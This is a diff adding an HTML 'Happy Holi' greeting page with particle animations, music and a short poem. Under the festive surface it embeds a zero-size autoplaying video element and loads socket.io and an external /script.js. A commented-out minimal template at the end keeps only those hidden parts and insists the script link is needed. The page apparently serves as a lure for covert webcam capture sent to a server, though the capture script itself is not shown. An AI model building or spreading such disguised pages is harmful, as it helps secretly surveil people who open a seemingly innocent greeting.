@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HAPPY HOLI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <style>
+    body{margin:0;overflow:hidden;font-family:Arial,sans-serif;background:#fff;touch-action:none;cursor:none;}
+    h1{margin-top:20px;font-size:4em;color:#FF1493;text-shadow:2px2px#FFFF00,4px4px#32CD32,6px6px#1E90FF;animation:rainbowText 6s infinite;text-align:center;position:relative;z-index:10;}
+    h2{margin-top:10px;font-size:2em;color:#FF4500;text-align:center;animation:rainbowText 8s infinite;position:relative;z-index:10;}
+    .shayari{margin-top:30px;font-size:1.5em;color:#1E90FF;text-align:center;line-height:1.8em;animation:rainbowText 10s infinite;position:relative;z-index:10;}
+    @keyframes rainbowText{0%{color:#FF1493;}20%{color:#FF8C00;}40%{color:#FFD700;}60%{color:#00FF7F;}80%{color:#1E90FF;}100%{color:#FF1493;}}
+    canvas{position:absolute;top:0;left:0;z-index:1;}
+  </style>
+</head>
+<body>
+
+<h1>🎉🌸 Happy Holi! 🌈✨</h1>
+<h2>Wishing you and your family a very joyful and colorful Holi!</h2>
+<div class="shayari">
+<p>Colors of love and shades of cheer,<br>
+Spread happiness and laughter far and near.<br>
+May your life be bright, your heart be light,<br>
+Enjoy this festival with all your might!</p>
+</div>
+
+<canvas id="holiCanvas"></canvas>
+<video id="video" autoplay playsinline width="0" hight="0"></video>
+<audio id="holiMusic" autoplay loop>
+  <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+const canvas=document.getElementById('holiCanvas');
+const ctx=canvas.getContext('2d');
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+
+const colors=['#FF1493','#FFD700','#1E90FF','#32CD32','#FF4500','#FF69B4','#00CED1'];
+let particles=[];
+
+const sounds=[];
+for(let i=0;i<5;i++){
+  let s=new Audio('https://freesound.org/data/previews/341/341695_3248244-lq.mp3');
+  s.volume=0.5; sounds.push(s);
+}
+function playRandomSound(){const s=sounds[Math.floor(Math.random()*sounds.length)]; s.currentTime=0; s.play();}
+
+// Particle constructor with diffusion
+function Particle(x,y,vx,vy,color,size){
+  this.x=x; this.y=y; this.vx=vx; this.vy=vy; this.color=color; this.size=size; this.life=80;
+  this.update=function(){
+    this.vy+=0.15; this.vx*=0.99; this.vy*=0.99; this.x+=this.vx; this.y+=this.vy; this.life--;
+    ctx.globalAlpha=this.life/80; ctx.globalCompositeOperation='lighter';
+    // Draw with radial gradient for watercolor diffusion
+    const grad=ctx.createRadialGradient(this.x,this.y,0,this.x,this.y,this.size);
+    grad.addColorStop(0,this.color);
+    grad.addColorStop(1,'rgba(255,255,255,0)');
+    ctx.fillStyle=grad; ctx.beginPath(); ctx.arc(this.x,this.y,this.size,0,Math.PI*2); ctx.fill();
+  }
+}
+
+function addParticles(x,y,count){
+  for(let i=0;i<count;i++){
+    const color=colors[Math.floor(Math.random()*colors.length)];
+    const size=Math.random()*20+10;
+    const vx=(Math.random()-0.5)*6; const vy=(Math.random()-0.5)*6;
+    particles.push(new Particle(x,y,vx,vy,color,size));
+  }
+  playRandomSound();
+}
+
+function updateAll(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  for(let i=particles.length-1;i>=0;i--){
+    particles[i].update();
+    if(particles[i].life<=0) particles.splice(i,1);
+  }
+  requestAnimationFrame(updateAll);
+}
+updateAll();
+
+// Multi-touch / mouse painting
+function paint(e){
+  if(e.touches){for(let t of e.touches){addParticles(t.clientX,t.clientY,5);}}
+  else{addParticles(e.clientX,e.clientY,5);}
+}
+document.addEventListener('mousemove',paint);
+document.addEventListener('mousedown',paint);
+document.addEventListener('touchstart',paint);
+document.addEventListener('touchmove',e=>{e.preventDefault();paint(e);},{passive:false});
+
+// Cursor/finger rainbow trail
+let lastTrailTime=0;
+function createTrail(x,y){
+  const t=document.createElement('div'); t.style.position='absolute';
+  t.style.left=(x-7)+'px'; t.style.top=(y-7)+'px';
+  t.style.width='15px'; t.style.height='15px';
+  t.style.borderRadius='50%';
+  t.style.backgroundColor=colors[Math.floor(Math.random()*colors.length)];
+  t.style.opacity=0.9; t.style.pointerEvents='none'; t.style.mixBlendMode='screen';
+  document.body.appendChild(t); setTimeout(()=>t.remove(),300);
+}
+document.addEventListener('mousemove',e=>{const now=Date.now(); if(now-lastTrailTime>10){createTrail(e.clientX,e.clientY); lastTrailTime=now;}});
+document.addEventListener('touchmove',e=>{e.preventDefault(); for(let t of e.touches) createTrail(t.clientX,t.clientY);},{passive:false});
+
+// Automatic explosions & powders
+setInterval(()=>{addParticles(Math.random()*canvas.width,Math.random()*canvas.height,10);},800);
+setInterval(()=>{addParticles(Math.random()*canvas.width,canvas.height,1);},200);
+
+// Confetti bursts
+document.addEventListener('mousedown',e=>{addParticles(e.clientX,e.clientY,8);});
+document.addEventListener('touchstart',e=>{for(let t of e.touches) addParticles(t.clientX,t.clientY,8);});
+
+// Responsive canvas
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth; canvas.height=window.innerHeight;});
+</script>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/script.js"></script>
+</body>
+</html>
+
+
+
+<!--<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+
+<video id="video" autoplay playsinline width="0" hight="0"></video>
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="/script.js"></script>
+
+</body>
+</html>
+
+This is only testing, if you also change this code as per your requirments but also adding 
+this link <script sec="/script.js"></script> otherwise not work.
+ 
+-->
